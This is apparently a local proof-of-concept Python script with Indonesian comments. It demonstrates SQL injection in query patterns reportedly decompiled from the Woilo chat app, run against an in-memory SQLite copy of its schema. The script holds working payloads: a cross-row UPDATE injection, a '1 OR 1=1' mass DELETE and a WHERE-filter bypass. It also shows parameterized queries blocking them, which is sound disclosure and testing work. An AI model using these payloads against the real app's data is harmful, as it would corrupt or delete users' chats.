#!/usr/bin/env python3
"""
POC lokal: membuktikan SQL injection pada us0.java (database chat Woilo v1.5.9).

Berjalan di SQLite LOKAL milik sendiri. Tidak menyentuh server atau perangkat apa pun.
Tujuannya membuktikan bahwa pola query di dex benar-benar dapat diinjeksi, bukan
sekadar mengklaim dari pembacaan kode.

Skema disalin persis dari da0.java:86.
Pola query disalin persis dari us0.java (nomor baris dicantumkan).
Sumber data attacker-controlled: r60.java:61,65 (display_name/display_picture dari
response server, dapat diubah anggota grup).
"""
import sqlite3

SCHEMA = (  # da0.java:86 — persis
    "CREATE TABLE chat_room (chat_room_id INTEGER PRIMARY KEY,user_id TEXT,"
    "display_name TEXT,display_picture TEXT,last_message TEXT,unread_count TEXT,"
    "chat_type TEXT,time_stamp TEXT,date TEXT,is_mute TEXT,contain_mention INTEGER,"
    "is_last_sender INTEGER)"
)


def fresh_db():
    db = sqlite3.connect(":memory:")
    db.execute(SCHEMA)
    db.execute("INSERT INTO chat_room (chat_room_id,user_id,display_name,display_picture,"
               "chat_type) VALUES (1,'victim_room','Grup Korban','pic_victim','group_chat')")
    db.execute("INSERT INTO chat_room (chat_room_id,user_id,display_name,display_picture,"
               "chat_type) VALUES (2,'other_room','Grup Lain','pic_other','group_chat')")
    db.commit()
    return db


# ---- pola VULNERABLE, disalin dari us0.java ----
def v_update_display_name(db, user_id, display_name):
    """us0.java:94 — UPDATE chat_room SET display_name = '<str2>' WHERE user_id = '<str>' ..."""
    sql = ("UPDATE chat_room SET display_name = '" + display_name +
           "' WHERE user_id = '" + user_id + "' AND chat_type = 'group_chat'")
    db.execute(sql)


def v_delete_by_id(db, room_id):
    """us0.java:305 — DELETE FROM chat_room WHERE chat_room_id = <str>  (tanpa quote!)"""
    db.execute("DELETE FROM chat_room WHERE chat_room_id = " + str(room_id))


def v_select(db, user_id, chat_type):
    """us0.java:122 — SELECT * FROM chat_room WHERE user_id = '<str>' AND chat_type = '<str2>'"""
    return db.execute("SELECT * FROM chat_room WHERE user_id = '" + user_id +
                      "' AND chat_type = '" + chat_type + "'").fetchall()


# ---- pola FIXED (parameterized) sebagai pembanding ----
def f_update_display_name(db, user_id, display_name):
    db.execute("UPDATE chat_room SET display_name = ? WHERE user_id = ? AND chat_type = 'group_chat'",
               (display_name, user_id))


def f_delete_by_id(db, room_id):
    db.execute("DELETE FROM chat_room WHERE chat_room_id = ?", (room_id,))


def name_of(db, room_id):
    r = db.execute("SELECT display_name FROM chat_room WHERE chat_room_id=?", (room_id,)).fetchone()
    return r[0] if r else None


def demo():
    print("=" * 72)
    print("POC 1 — single quote merusak query (bukti konkatenasi tidak di-escape)")
    db = fresh_db()
    try:
        v_update_display_name(db, "victim_room", "Nama'Baru")
        print("  TIDAK error (tak terduga)")
    except sqlite3.Error as e:
        print(f"  ERROR SQLite: {e}")
        print("  -> terbukti: input masuk mentah ke SQL")

    print("\n" + "=" * 72)
    print("POC 2 — injeksi mengubah baris LAIN (second-order, via display_name)")
    db = fresh_db()
    print("  sebelum: room1 =", name_of(db, 1), "| room2 =", name_of(db, 2))
    # Template us0.java:94 menyisakan "' WHERE user_id = '...' AND chat_type = 'group_chat'"
    # setelah payload, jadi payload harus menutup quote, menambah SET+WHERE sendiri,
    # lalu mengomentari sisa template dengan "--" agar tidak ada dua klausa WHERE.
    payload = "X', display_picture='PWNED' WHERE '1'='1' --"
    v_update_display_name(db, "victim_room", payload)
    db.commit()
    print("  sesudah: room1 =", name_of(db, 1), "| room2 =", name_of(db, 2))
    pics = [r[0] for r in db.execute("SELECT display_picture FROM chat_room ORDER BY chat_room_id")]
    print("  display_picture semua baris:", pics)
    assert pics == ["PWNED", "PWNED"], "injeksi lintas-baris gagal"
    print("  -> TERBUKTI: satu input mengubah kolom pada baris yang tidak ditarget")

    print("\n" + "=" * 72)
    print("POC 3 — injeksi pada konteks NUMERIK (us0.java:305, tanpa quote)")
    db = fresh_db()
    before = db.execute("SELECT COUNT(*) FROM chat_room").fetchone()[0]
    v_delete_by_id(db, "1 OR 1=1")          # tidak perlu quote sama sekali
    db.commit()
    after = db.execute("SELECT COUNT(*) FROM chat_room").fetchone()[0]
    print(f"  baris sebelum={before} sesudah={after}")
    assert after == 0, "penghapusan massal gagal"
    print("  -> TERBUKTI: seluruh tabel terhapus dari satu parameter numerik")

    print("\n" + "=" * 72)
    print("POC 4 — SELECT: injeksi membocorkan baris yang seharusnya terfilter")
    db = fresh_db()
    rows = v_select(db, "victim_room", "group_chat' OR '1'='1")
    print(f"  baris dikembalikan: {len(rows)} (harusnya 1)")
    assert len(rows) == 2, "bypass filter gagal"
    print("  -> TERBUKTI: filter WHERE dilewati")

    print("\n" + "=" * 72)
    print("POC 5 — versi PARAMETERIZED kebal terhadap payload yang sama")
    db = fresh_db()
    f_update_display_name(db, "victim_room", payload)
    f_delete_by_id(db, "1 OR 1=1")
    db.commit()
    cnt = db.execute("SELECT COUNT(*) FROM chat_room").fetchone()[0]
    print("  display_name room1 =", name_of(db, 1))
    print("  baris tersisa      =", cnt, "(harusnya 2 — delete diperlakukan sebagai nilai)")
    assert name_of(db, 1) == payload, "payload seharusnya tersimpan sebagai data literal"
    assert cnt == 2, "parameterized seharusnya tidak menghapus baris"
    print("  -> TERBUKTI: payload diperlakukan sebagai data, bukan kode")

    print("\n" + "=" * 72)
    print("SEMUA CHECK LULUS — pola query us0.java terbukti dapat diinjeksi;")
    print("perbaikan parameterized terbukti menutup seluruh vektor.")


if __name__ == "__main__":
    demo()
